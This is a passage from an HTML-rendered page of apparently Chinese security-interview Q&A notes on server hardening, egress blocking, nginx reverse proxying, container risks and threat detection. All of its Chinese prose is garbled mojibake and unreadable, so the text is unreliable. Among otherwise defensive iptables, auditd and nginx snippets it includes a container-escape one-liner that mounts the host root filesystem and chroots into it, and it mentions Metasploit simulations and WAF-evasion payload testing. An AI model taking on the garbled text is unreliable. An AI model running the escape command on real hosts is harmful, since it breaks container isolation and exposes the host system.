class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">disable</span> telnet</span><br></pre></td></tr></table></figure><br>2. <strong>æ—¥å¿—å®¡è®¡</strong>ï¼š<br>   - å¯ç”¨ <code>auditd</code> è®°å½•å…³é”®æ“ä½œï¼š<br>     <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auditctl -w /etc/passwd -p wa -k passwd_change</span><br></pre></td></tr></table></figure><br>3. <strong>è®¿é—®æ§åˆ¶</strong>ï¼š<br>   - ä»…å…è®¸ç‰¹å®š IP ç™»å½•ï¼š<br>     <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 22 -s 192.168.1.100 -j ACCEPT</span><br></pre></td></tr></table></figure></h2><h3 id="ç¦æ­¢å‡ºç½‘çš„ä»·å€¼æœ‰å“ªäº›ï¼Ÿ"><a href="#ç¦æ­¢å‡ºç½‘çš„ä»·å€¼æœ‰å“ªäº›ï¼Ÿ" class="headerlink" title="ç¦æ­¢å‡ºç½‘çš„ä»·å€¼æœ‰å“ªäº›ï¼Ÿ"></a><strong>ç¦æ­¢å‡ºç½‘çš„ä»·å€¼æœ‰å“ªäº›ï¼Ÿ</strong></h3><p><strong>ä¸»è¦ä»·å€¼</strong>ï¼š</p><ol><li><strong>é˜²æ­¢æ•°æ®æ³„éœ²</strong>ï¼š<ul><li>é™åˆ¶æœåŠ¡å™¨ä¸»åŠ¨è¿æ¥å¤–éƒ¨ IPï¼Œé˜²æ­¢æ•°æ®å¤–æ³„ã€‚</li></ul></li><li><strong>é˜»æ­¢ C2ï¼ˆC&amp;Cï¼‰é€šä¿¡</strong>ï¼š<ul><li>é˜²æ­¢æ¶æ„è½¯ä»¶ä¸æ”»å‡»è€…æœåŠ¡å™¨å»ºç«‹è¿æ¥ã€‚</li></ul></li></ol><h2 id="å®æ–½æ–¹æ³•ï¼š-é…ç½®é˜²ç«å¢™è§„åˆ™ï¼š"><a href="#å®æ–½æ–¹æ³•ï¼š-é…ç½®é˜²ç«å¢™è§„åˆ™ï¼š" class="headerlink" title="å®æ–½æ–¹æ³•ï¼š- é…ç½®é˜²ç«å¢™è§„åˆ™ï¼š  "></a><strong>å®æ–½æ–¹æ³•</strong>ï¼š<br>- é…ç½®é˜²ç«å¢™è§„åˆ™ï¼š<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A OUTPUT -p tcp -j REJECT</span><br></pre></td></tr></table></figure></h2><h3 id="äº‘åŸç”Ÿä¸‹çš„ç½‘ç»œå’Œä¸»æœºå·®å¼‚æ˜¯ä»€ä¹ˆï¼Ÿä¼šæœ‰å“ªäº›æ–°çš„é£é™©ï¼Ÿ"><a href="#äº‘åŸç”Ÿä¸‹çš„ç½‘ç»œå’Œä¸»æœºå·®å¼‚æ˜¯ä»€ä¹ˆï¼Ÿä¼šæœ‰å“ªäº›æ–°çš„é£é™©ï¼Ÿ" class="headerlink" title="äº‘åŸç”Ÿä¸‹çš„ç½‘ç»œå’Œä¸»æœºå·®å¼‚æ˜¯ä»€ä¹ˆï¼Ÿä¼šæœ‰å“ªäº›æ–°çš„é£é™©ï¼Ÿ"></a><strong>äº‘åŸç”Ÿä¸‹çš„ç½‘ç»œå’Œä¸»æœºå·®å¼‚æ˜¯ä»€ä¹ˆï¼Ÿä¼šæœ‰å“ªäº›æ–°çš„é£é™©ï¼Ÿ</strong></h3><p><strong>ä¸»è¦å·®å¼‚</strong>ï¼š</p><ul><li><strong>ä¼ ç»Ÿä¸»æœº</strong>ï¼šä¾èµ–å›ºå®š IPï¼ŒåŸºäº <strong>é˜²ç«å¢™</strong> ä¿æŠ¤ã€‚</li><li><strong>äº‘åŸç”Ÿ</strong>ï¼šåŸºäº <strong>å®¹å™¨ç½‘ç»œï¼ˆCNIï¼‰</strong>ï¼Œé‡‡ç”¨ <strong>å¾®æœåŠ¡æ¶æ„</strong>ã€‚</li></ul><h2 id="æ–°é£é™©ï¼š1-åŠ¨æ€-IP-å˜åŒ–ï¼š-ä¼ ç»Ÿ-ACL-è§„åˆ™éš¾ä»¥é€‚é…ã€‚2-æ¨ªå‘æ”»å‡»é£é™©ï¼š-å®¹å™¨ç½‘ç»œéš”ç¦»ä¸è¶³ï¼Œæ”»å‡»è€…å¯åœ¨åŒä¸€é›†ç¾¤å†…æ¨ªå‘ç§»åŠ¨ã€‚"><a href="#æ–°é£é™©ï¼š1-åŠ¨æ€-IP-å˜åŒ–ï¼š-ä¼ ç»Ÿ-ACL-è§„åˆ™éš¾ä»¥é€‚é…ã€‚2-æ¨ªå‘æ”»å‡»é£é™©ï¼š-å®¹å™¨ç½‘ç»œéš”ç¦»ä¸è¶³ï¼Œæ”»å‡»è€…å¯åœ¨åŒä¸€é›†ç¾¤å†…æ¨ªå‘ç§»åŠ¨ã€‚" class="headerlink" title="æ–°é£é™©ï¼š1. åŠ¨æ€ IP å˜åŒ–ï¼š   - ä¼ ç»Ÿ ACL è§„åˆ™éš¾ä»¥é€‚é…ã€‚2. æ¨ªå‘æ”»å‡»é£é™©ï¼š   - å®¹å™¨ç½‘ç»œéš”ç¦»ä¸è¶³ï¼Œæ”»å‡»è€…å¯åœ¨åŒä¸€é›†ç¾¤å†…æ¨ªå‘ç§»åŠ¨ã€‚"></a><strong>æ–°é£é™©</strong>ï¼š<br>1. <strong>åŠ¨æ€ IP å˜åŒ–</strong>ï¼š<br>   - ä¼ ç»Ÿ ACL è§„åˆ™éš¾ä»¥é€‚é…ã€‚<br>2. <strong>æ¨ªå‘æ”»å‡»é£é™©</strong>ï¼š<br>   - å®¹å™¨ç½‘ç»œéš”ç¦»ä¸è¶³ï¼Œæ”»å‡»è€…å¯åœ¨åŒä¸€é›†ç¾¤å†…æ¨ªå‘ç§»åŠ¨ã€‚</h2><h3 id="å¦‚ä½•å®ç°åå‘-HTTPS-ä»£ç†ï¼Ÿ"><a href="#å¦‚ä½•å®ç°åå‘-HTTPS-ä»£ç†ï¼Ÿ" class="headerlink" title="å¦‚ä½•å®ç°åå‘ HTTPS ä»£ç†ï¼Ÿ"></a><strong>å¦‚ä½•å®ç°åå‘ HTTPS ä»£ç†ï¼Ÿ</strong></h3><h2 id="Nginx-é…ç½®åå‘ä»£ç†ï¼š"><a href="#Nginx-é…ç½®åå‘ä»£ç†ï¼š" class="headerlink" title="Nginx é…ç½®åå‘ä»£ç†ï¼š"></a><strong>Nginx é…ç½®åå‘ä»£ç†</strong>ï¼š<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">443</span> ssl;</span><br><span class="line">    <span class="attribute">server_name</span> example.com;</span><br><span class="line">    </span><br><span class="line">    <span class="attribute">ssl_certificate</span> /etc/nginx/cert.pem;</span><br><span class="line">    <span class="attribute">ssl_certificate_key</span> /etc/nginx/key.pem;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> https://backend.server.com;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></h2><h3 id="å¦‚ä½•é€šè¿‡æŠ€æœ¯æ‰‹æ®µé¿å…éé¢„æœŸç«¯å£å¼€æ”¾ï¼Ÿ"><a href="#å¦‚ä½•é€šè¿‡æŠ€æœ¯æ‰‹æ®µé¿å…éé¢„æœŸç«¯å£å¼€æ”¾ï¼Ÿ" class="headerlink" title="å¦‚ä½•é€šè¿‡æŠ€æœ¯æ‰‹æ®µé¿å…éé¢„æœŸç«¯å£å¼€æ”¾ï¼Ÿ"></a><strong>å¦‚ä½•é€šè¿‡æŠ€æœ¯æ‰‹æ®µé¿å…éé¢„æœŸç«¯å£å¼€æ”¾ï¼Ÿ</strong></h3><h2 id="æ–¹æ³•ï¼š1-ä½¿ç”¨é˜²ç«å¢™ï¼š-2-ç«¯å£ç›‘å¬ç›‘æµ‹ï¼š-3-åº”ç”¨å±‚è®¿é—®æ§åˆ¶ï¼š-é…ç½®-Nginx-ä»…å…è®¸ç‰¹å®š-IP-è®¿é—®ï¼š"><a href="#æ–¹æ³•ï¼š1-ä½¿ç”¨é˜²ç«å¢™ï¼š-2-ç«¯å£ç›‘å¬ç›‘æµ‹ï¼š-3-åº”ç”¨å±‚è®¿é—®æ§åˆ¶ï¼š-é…ç½®-Nginx-ä»…å…è®¸ç‰¹å®š-IP-è®¿é—®ï¼š" class="headerlink" title="æ–¹æ³•ï¼š1. ä½¿ç”¨é˜²ç«å¢™ï¼š   2. ç«¯å£ç›‘å¬ç›‘æµ‹ï¼š   3. åº”ç”¨å±‚è®¿é—®æ§åˆ¶ï¼š   - é…ç½® Nginx ä»…å…è®¸ç‰¹å®š IP è®¿é—®ï¼š     "></a><strong>æ–¹æ³•</strong>ï¼š<br>1. <strong>ä½¿ç”¨é˜²ç«å¢™</strong>ï¼š<br>   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 3306 -j DROP</span><br></pre></td></tr></table></figure><br>2. <strong>ç«¯å£ç›‘å¬ç›‘æµ‹</strong>ï¼š<br>   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -tulnp | grep LISTEN</span><br></pre></td></tr></table></figure><br>3. <strong>åº”ç”¨å±‚è®¿é—®æ§åˆ¶</strong>ï¼š<br>   - é…ç½® <strong>Nginx ä»…å…è®¸ç‰¹å®š IP è®¿é—®</strong>ï¼š<br>     <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">allow</span> <span class="number">192.168.1.100</span>;</span><br><span class="line"><span class="attribute">deny</span> all;</span><br></pre></td></tr></table></figure></h2><h3 id="å®¹å™¨å­˜åœ¨å“ªäº›ç‰¹æœ‰å®‰å…¨é£é™©ï¼Ÿ"><a href="#å®¹å™¨å­˜åœ¨å“ªäº›ç‰¹æœ‰å®‰å…¨é£é™©ï¼Ÿ" class="headerlink" title="å®¹å™¨å­˜åœ¨å“ªäº›ç‰¹æœ‰å®‰å…¨é£é™©ï¼Ÿ"></a><strong>å®¹å™¨å­˜åœ¨å“ªäº›ç‰¹æœ‰å®‰å…¨é£é™©ï¼Ÿ</strong></h3><ol><li><strong>å®¹å™¨é€ƒé€¸</strong>ï¼š<ul><li>é€šè¿‡ <code>docker.sock</code> è®¿é—®å®¿ä¸»æœºï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /:/host ubuntu <span class="built_in">chroot</span> /host</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>é•œåƒä¾›åº”é“¾æ”»å‡»</strong>ï¼š<ul><li>æ¶æ„é•œåƒå¯èƒ½åŒ…å«åé—¨ã€‚</li></ul></li></ol><h2 id="é˜²æŠ¤æªæ–½ï¼š-é™åˆ¶å®¹å™¨æƒé™ï¼š-ä½¿ç”¨å¯ä¿¡é•œåƒæ¥æºã€‚"><a href="#é˜²æŠ¤æªæ–½ï¼š-é™åˆ¶å®¹å™¨æƒé™ï¼š-ä½¿ç”¨å¯ä¿¡é•œåƒæ¥æºã€‚" class="headerlink" title="é˜²æŠ¤æªæ–½ï¼š- é™åˆ¶å®¹å™¨æƒé™ï¼š  - ä½¿ç”¨å¯ä¿¡é•œåƒæ¥æºã€‚"></a><strong>é˜²æŠ¤æªæ–½</strong>ï¼š<br>- é™åˆ¶å®¹å™¨æƒé™ï¼š<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --cap-drop=ALL</span><br></pre></td></tr></table></figure><br>- ä½¿ç”¨å¯ä¿¡é•œåƒæ¥æºã€‚</h2><h3 id="è¿ç»´è‡ªå±åŒ–çš„éš¾ç‚¹æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#è¿ç»´è‡ªå±åŒ–çš„éš¾ç‚¹æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="è¿ç»´è‡ªå±åŒ–çš„éš¾ç‚¹æ˜¯ä»€ä¹ˆï¼Ÿ"></a><strong>è¿ç»´è‡ªå±åŒ–çš„éš¾ç‚¹æ˜¯ä»€ä¹ˆï¼Ÿ</strong></h3><ol><li><strong>è‡ªåŠ¨åŒ–ç¨‹åº¦è¦æ±‚é«˜</strong>ï¼š<ul><li>éœ€è¦ DevOps&#x2F;CI&#x2F;CD æ·±åº¦é›†æˆã€‚</li></ul></li><li><strong>å®‰å…¨ç­–ç•¥åŒæ­¥</strong>ï¼š<ul><li>é˜²ç«å¢™ã€èº«ä»½éªŒè¯ç­–ç•¥éœ€ä¸€è‡´ã€‚</li></ul></li></ol><hr><h3 id="ä¸åŒè¯­è¨€å¯¹äºç³»ç»Ÿ-CA-è¯ä¹¦çš„ä¿¡ä»»æƒ…å†µæœ‰ä½•ä¸åŒï¼Ÿå¦‚ä½•è®©å„è¯­è¨€ä¿¡ä»»ç³»ç»Ÿ-CA-è¯ä¹¦ï¼Ÿ"><a href="#ä¸åŒè¯­è¨€å¯¹äºç³»ç»Ÿ-CA-è¯ä¹¦çš„ä¿¡ä»»æƒ…å†µæœ‰ä½•ä¸åŒï¼Ÿå¦‚ä½•è®©å„è¯­è¨€ä¿¡ä»»ç³»ç»Ÿ-CA-è¯ä¹¦ï¼Ÿ" class="headerlink" title="ä¸åŒè¯­è¨€å¯¹äºç³»ç»Ÿ CA è¯ä¹¦çš„ä¿¡ä»»æƒ…å†µæœ‰ä½•ä¸åŒï¼Ÿå¦‚ä½•è®©å„è¯­è¨€ä¿¡ä»»ç³»ç»Ÿ CA è¯ä¹¦ï¼Ÿ"></a><strong>ä¸åŒè¯­è¨€å¯¹äºç³»ç»Ÿ CA è¯ä¹¦çš„ä¿¡ä»»æƒ…å†µæœ‰ä½•ä¸åŒï¼Ÿå¦‚ä½•è®©å„è¯­è¨€ä¿¡ä»»ç³»ç»Ÿ CA è¯ä¹¦ï¼Ÿ</strong></h3><table><thead><tr><th><strong>è¯­è¨€</strong></th><th><strong>é»˜è®¤ CA è¯ä¹¦ç­–ç•¥</strong></th><th><strong>ä¿¡ä»»ç³»ç»Ÿ CA è¯ä¹¦æ–¹å¼</strong></th></tr></thead><tbody><tr><td><strong>Java</strong></td><td>ä½¿ç”¨ JDK å†…ç½® CA</td><td><code>keytool -importkeystore</code></td></tr><tr><td><strong>Python</strong></td><td>ä½¿ç”¨ <code>certifi</code></td><td><code>export CURL_CA_BUNDLE</code></td></tr><tr><td><strong>Node.js</strong></td><td>é»˜è®¤ä¸ä¿¡ä»»</td><td><code>export NODE_EXTRA_CA_CERTS</code></td></tr></tbody></table><hr><h3 id="ç®€å•æè¿°æœ‰å“ªå‡ ç§æ–¹å¼å®ç°æœåŠ¡å™¨æˆªå¤–è”ï¼Œå„è‡ªåˆ©å¼Šæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#ç®€å•æè¿°æœ‰å“ªå‡ ç§æ–¹å¼å®ç°æœåŠ¡å™¨æˆªå¤–è”ï¼Œå„è‡ªåˆ©å¼Šæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="ç®€å•æè¿°æœ‰å“ªå‡ ç§æ–¹å¼å®ç°æœåŠ¡å™¨æˆªå¤–è”ï¼Œå„è‡ªåˆ©å¼Šæ˜¯ä»€ä¹ˆï¼Ÿ"></a><strong>ç®€å•æè¿°æœ‰å“ªå‡ ç§æ–¹å¼å®ç°æœåŠ¡å™¨æˆªå¤–è”ï¼Œå„è‡ªåˆ©å¼Šæ˜¯ä»€ä¹ˆï¼Ÿ</strong></h3><ol><li><p><strong>é˜²ç«å¢™è§„åˆ™</strong>ï¼ˆæœ€å¸¸ç”¨ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A OUTPUT -p tcp -j REJECT</span><br></pre></td></tr></table></figure><p><strong>ä¼˜ç‚¹</strong>ï¼šé«˜æ•ˆã€ç›´æ¥ã€‚<br><strong>ç¼ºç‚¹</strong>ï¼šè¯¯æ“ä½œå¯èƒ½å½±å“æ­£å¸¸ä¸šåŠ¡ã€‚</p></li><li><p><strong>ä»£ç†æœåŠ¡å™¨</strong>ï¼ˆé€æ˜ä»£ç†ï¼‰</p><ul><li>é€šè¿‡ <strong>Squidã€Shadowsocks</strong> æ§åˆ¶æµé‡ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=<span class="string">&quot;http://proxy.server:3128&quot;</span></span><br></pre></td></tr></table></figure><strong>ä¼˜ç‚¹</strong>ï¼šå¯å®¡è®¡æµé‡ã€‚<br><strong>ç¼ºç‚¹</strong>ï¼šé¢å¤–ç»´æŠ¤æˆæœ¬ã€‚</li></ul></li><li><p><strong>DNS è§£ææ§åˆ¶</strong></p><ul><li>ä»…å…è®¸å¯ä¿¡åŸŸåè§£æï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;127.0.0.1 malicious.com&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><strong>ä¼˜ç‚¹</strong>ï¼šé˜²æ­¢æ¶æ„ C2 é€šä¿¡ã€‚<br><strong>ç¼ºç‚¹</strong>ï¼šä¸é€‚ç”¨äº IP ç›´è¿æµé‡ã€‚</li></ul></li><li><p><strong>SOCKS5 éš§é“</strong></p><ul><li>é€šè¿‡ <strong>SSH éš§é“</strong> æ§åˆ¶ç½‘ç»œæµé‡ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 1080 user@proxy-server</span><br></pre></td></tr></table></figure><strong>ä¼˜ç‚¹</strong>ï¼šå¯ç”¨äºåŠ å¯†é€šä¿¡ã€‚<br><strong>ç¼ºç‚¹</strong>ï¼šéœ€è¦ SOCKS5 ä»£ç†æ”¯æŒã€‚</li></ul></li></ol><h2 id="å¨èƒåº”å¯¹å²—"><a href="#å¨èƒåº”å¯¹å²—" class="headerlink" title="å¨èƒåº”å¯¹å²—"></a>å¨èƒåº”å¯¹å²—</h2><h3 id="å¦‚ä½•è¡¡é‡å¨èƒæ„ŸçŸ¥èƒ½åŠ›å¼ºå¼±ï¼Ÿ"><a href="#å¦‚ä½•è¡¡é‡å¨èƒæ„ŸçŸ¥èƒ½åŠ›å¼ºå¼±ï¼Ÿ" class="headerlink" title="å¦‚ä½•è¡¡é‡å¨èƒæ„ŸçŸ¥èƒ½åŠ›å¼ºå¼±ï¼Ÿ"></a><strong>å¦‚ä½•è¡¡é‡å¨èƒæ„ŸçŸ¥èƒ½åŠ›å¼ºå¼±ï¼Ÿ</strong></h3><p><strong>è¡¡é‡æŒ‡æ ‡</strong>ï¼š</p><ol><li><strong>æ£€æµ‹è¦†ç›–ç‡</strong>ï¼š<ul><li>èƒ½å¦è¦†ç›– <strong>ç½‘ç»œã€åº”ç”¨ã€ç»ˆç«¯ã€æ—¥å¿—</strong> å¤šä¸ªå±‚é¢ã€‚</li></ul></li><li><strong>è¯¯æŠ¥ç‡&#x2F;æ¼æŠ¥ç‡</strong>ï¼š<ul><li>è¯¯æŠ¥è¿‡å¤šä¼šå½±å“è¿ç»´ï¼Œæ¼æŠ¥åˆ™å¯èƒ½å¯¼è‡´æ”»å‡»æœªè¢«å‘ç°ã€‚</li></ul></li><li><strong>å®æ—¶æ€§</strong>ï¼š<ul><li>æ˜¯å¦èƒ½å¤Ÿ <strong>å®æ—¶åˆ†æã€ç§’çº§å“åº”</strong>ã€‚</li></ul></li></ol><p><strong>æå‡æ–¹æ³•</strong>ï¼š</p><ul><li>ç»“åˆ <strong>AI æœºå™¨å­¦ä¹ </strong> æå‡å¨èƒæ£€æµ‹ç²¾å‡†åº¦ã€‚</li><li>é‡‡ç”¨ <strong>å…³è”åˆ†æï¼ˆSIEMï¼‰</strong>ï¼Œåˆ†æä¸åŒæ—¥å¿—æ¥æºçš„æ•°æ®ã€‚</li></ul><hr><h3 id="æ„ŸçŸ¥è§„åˆ™çš„æœ‰æ•ˆæ€§å¦‚ä½•ç³»ç»ŸéªŒè¯ï¼Ÿ"><a href="#æ„ŸçŸ¥è§„åˆ™çš„æœ‰æ•ˆæ€§å¦‚ä½•ç³»ç»ŸéªŒè¯ï¼Ÿ" class="headerlink" title="æ„ŸçŸ¥è§„åˆ™çš„æœ‰æ•ˆæ€§å¦‚ä½•ç³»ç»ŸéªŒè¯ï¼Ÿ"></a><strong>æ„ŸçŸ¥è§„åˆ™çš„æœ‰æ•ˆæ€§å¦‚ä½•ç³»ç»ŸéªŒè¯ï¼Ÿ</strong></h3><h2 id="éªŒè¯æ–¹æ³•ï¼š1-æ”»å‡»æ¨¡æ‹Ÿæµ‹è¯•ï¼š-ä½¿ç”¨-Kali-Linuxã€Metasploit-æ¨¡æ‹Ÿæ”»å‡»åœºæ™¯ï¼Œæµ‹è¯•è§„åˆ™æ˜¯å¦ç”Ÿæ•ˆã€‚2-å†å²æ”»å‡»å›æ”¾ï¼š-é€šè¿‡-æ—¥å¿—é‡æ”¾-å¤ç°çœŸå®æ”»å‡»æµé‡ï¼ŒéªŒè¯æ‹¦æˆªæ•ˆæœï¼š-3-å¯¹æŠ—æ ·æœ¬æµ‹è¯•ï¼š-ç”Ÿæˆå˜ç§æ”»å‡»-payloadï¼Œæµ‹è¯•-WAF-è§„é¿èƒ½åŠ›ã€‚"><a href="#éªŒè¯æ–¹æ³•ï¼š1-æ”»å‡»æ¨¡æ‹Ÿæµ‹è¯•ï¼š-ä½¿ç”¨-Kali-Linuxã€Metasploit-æ¨¡æ‹Ÿæ”»å‡»åœºæ™¯ï¼Œæµ‹è¯•è§„åˆ™æ˜¯å¦ç”Ÿæ•ˆã€‚2-å†å²æ”»å‡»å›æ”¾ï¼š-é€šè¿‡-æ—¥å¿—é‡æ”¾-å¤ç°çœŸå®æ”»å‡»æµé‡ï¼ŒéªŒè¯æ‹¦æˆªæ•ˆæœï¼š-3-å¯¹æŠ—æ ·æœ¬æµ‹è¯•ï¼š-ç”Ÿæˆå˜ç§æ”»å‡»-payloadï¼Œæµ‹è¯•-WAF-è§„é¿èƒ½åŠ›ã€‚" class="headerlink" title="éªŒè¯æ–¹æ³•ï¼š1. æ”»å‡»æ¨¡æ‹Ÿæµ‹è¯•ï¼š   - ä½¿ç”¨ Kali Linuxã€Metasploit æ¨¡æ‹Ÿæ”»å‡»åœºæ™¯ï¼Œæµ‹è¯•è§„åˆ™æ˜¯å¦ç”Ÿæ•ˆã€‚2. å†å²æ”»å‡»å›æ”¾ï¼š   - é€šè¿‡ æ—¥å¿—é‡æ”¾ å¤ç°çœŸå®æ”»å‡»æµé‡ï¼ŒéªŒè¯æ‹¦æˆªæ•ˆæœï¼š     3. å¯¹æŠ—æ ·æœ¬æµ‹è¯•ï¼š   - ç”Ÿæˆå˜ç§æ”»å‡» payloadï¼Œæµ‹è¯• WAF è§„é¿èƒ½åŠ›ã€‚"></a><strong>éªŒè¯æ–¹æ³•</strong>ï¼š<br>1. <strong>æ”»å‡»æ¨¡æ‹Ÿæµ‹è¯•</strong>ï¼š<br>   - ä½¿ç”¨ <strong>Kali Linux</strong>ã€<strong>Metasploit</strong> æ¨¡æ‹Ÿæ”»å‡»åœºæ™¯ï¼Œæµ‹è¯•è§„åˆ™æ˜¯å¦ç”Ÿæ•ˆã€‚<br>2. <strong>å†å²æ”»å‡»å›æ”¾</strong>ï¼š<br>   - é€šè¿‡ <strong>æ—¥å¿—é‡æ”¾</strong> å¤ç°çœŸå®æ”»å‡»æµé‡ï¼ŒéªŒè¯æ‹¦æˆªæ•ˆæœï¼š<br>     <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpreplay -i eth0 attack_traffic.pcap</span><br></pre></td></tr></table></figure><br>3. <strong>å¯¹æŠ—æ ·æœ¬æµ‹è¯•</strong>ï¼š<br>   - ç”Ÿæˆå˜ç§æ”»å‡» payloadï¼Œæµ‹è¯• WAF è§„é¿èƒ½åŠ›ã€‚</h2><h3 id="æœªçŸ¥éƒ¨åˆ†å¦‚ä½•è¡¡é‡ï¼Ÿ"><a href="#æœªçŸ¥éƒ¨åˆ†å¦‚ä½•è¡¡é‡ï¼Ÿ" class="headerlink" title="æœªçŸ¥éƒ¨åˆ†å¦‚ä½•è¡¡é‡ï¼Ÿ"></a><strong>æœªçŸ¥éƒ¨åˆ†å¦‚ä½•è¡¡é‡ï¼Ÿ</strong></h3><h2 id="æœªçŸ¥å¨èƒçš„è¡¡é‡æ–¹æ³•ï¼š1-åŸºçº¿åç¦»æ£€æµ‹ï¼š-è®°å½•-æ­£å¸¸æµé‡æ¨¡å¼ï¼Œå‘ç°å¼‚å¸¸è¡Œä¸ºï¼š-2-è¡Œä¸ºåˆ†æï¼š-é‡‡ç”¨-UEBAï¼ˆç”¨æˆ·å®ä½“è¡Œä¸ºåˆ†æï¼‰ï¼Œæ£€æµ‹å¼‚å¸¸è¡Œä¸ºæ¨¡å¼ã€‚3-èœœç½æŠ€æœ¯ï¼š-éƒ¨ç½²-Honeypot-è¯±æ•æ”»å‡»è€…ï¼Œåˆ†ææœªçŸ¥æ”»å‡»æ–¹å¼ã€‚"><a href="#æœªçŸ¥å¨èƒçš„è¡¡é‡æ–¹æ³•ï¼š1-åŸºçº¿åç¦»æ£€æµ‹ï¼š-è®°å½•-æ­£å¸¸æµé‡æ¨¡å¼ï¼Œå‘ç°å¼‚å¸¸è¡Œä¸ºï¼š-2-è¡Œä¸ºåˆ†æï¼š-é‡‡ç”¨-UEBAï¼ˆç”¨æˆ·å®ä½“è¡Œä¸ºåˆ†æï¼‰ï¼Œæ£€æµ‹å¼‚å¸¸è¡Œä¸ºæ¨¡å¼ã€‚3-èœœç½æŠ€æœ¯ï¼š-éƒ¨ç½²-Honeypot-è¯±æ•æ”»å‡»è€…ï¼Œåˆ†ææœªçŸ¥æ”»å‡»æ–¹å¼ã€‚" class="headerlink" title="æœªçŸ¥å¨èƒçš„è¡¡é‡æ–¹æ³•ï¼š1. åŸºçº¿åç¦»æ£€æµ‹ï¼š   - è®°å½• æ­£å¸¸æµé‡æ¨¡å¼ï¼Œå‘ç°å¼‚å¸¸è¡Œä¸ºï¼š     2. è¡Œä¸ºåˆ†æï¼š   - é‡‡ç”¨ UEBAï¼ˆç”¨æˆ·å®ä½“è¡Œä¸ºåˆ†æï¼‰ï¼Œæ£€æµ‹å¼‚å¸¸è¡Œä¸ºæ¨¡å¼ã€‚3. èœœç½æŠ€æœ¯ï¼š   - éƒ¨ç½² Honeypot è¯±æ•æ”»å‡»è€…ï¼Œåˆ†ææœªçŸ¥æ”»å‡»æ–¹å¼ã€‚"></a><strong>æœªçŸ¥å¨èƒçš„è¡¡é‡æ–¹æ³•</strong>ï¼š<br>1. <strong>åŸºçº¿åç¦»æ£€æµ‹</strong>ï¼š<br>   - è®°å½• <strong>æ­£å¸¸æµé‡æ¨¡å¼</strong>ï¼Œå‘ç°å¼‚å¸¸è¡Œä¸ºï¼š<br>     <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">df = pd.read_csv(<span class="string">&quot;traffic_logs.csv&quot;</span>)</span><br><span class="line">df.describe()</span><br></pre></td></tr></table></figure><br>2. <strong>è¡Œä¸ºåˆ†æ</strong>ï¼š<br>   - é‡‡ç”¨ <strong>UEBAï¼ˆç”¨æˆ·å®ä½“è¡Œä¸ºåˆ†æï¼‰</strong>ï¼Œæ£€æµ‹å¼‚å¸¸è¡Œä¸ºæ¨¡å¼ã€‚<br>3. <strong>èœœç½æŠ€æœ¯</strong>ï¼š<br>   - éƒ¨ç½² <strong>Honeypot</strong> è¯±æ•æ”»å‡»è€…ï¼Œåˆ†ææœªçŸ¥æ”»å‡»æ–¹å¼ã€‚</h2><h2 id="æµé‡é‡‡é›†ä¸æ¸…æ´—"><a href="#æµé‡é‡‡é›†ä¸æ¸…æ´—" class="headerlink" title="æµé‡é‡‡é›†ä¸æ¸…æ´—"></a><strong>æµé‡é‡‡é›†ä¸æ¸…æ´—</strong></h2><h3 id="å¨èƒæ„ŸçŸ¥å¯ä»¥åœ¨å“ªäº›å±‚é¢è¿›è¡Œï¼Ÿ"><a href="#å¨èƒæ„ŸçŸ¥å¯ä»¥åœ¨å“ªäº›å±‚é¢è¿›è¡Œï¼Ÿ" class="headerlink" title="å¨èƒæ„ŸçŸ¥å¯ä»¥åœ¨å“ªäº›å±‚é¢è¿›è¡Œï¼Ÿ"></a><strong>å¨èƒæ„ŸçŸ¥å¯ä»¥åœ¨å“ªäº›å±‚é¢è¿›è¡Œï¼Ÿ</strong></h3><h2 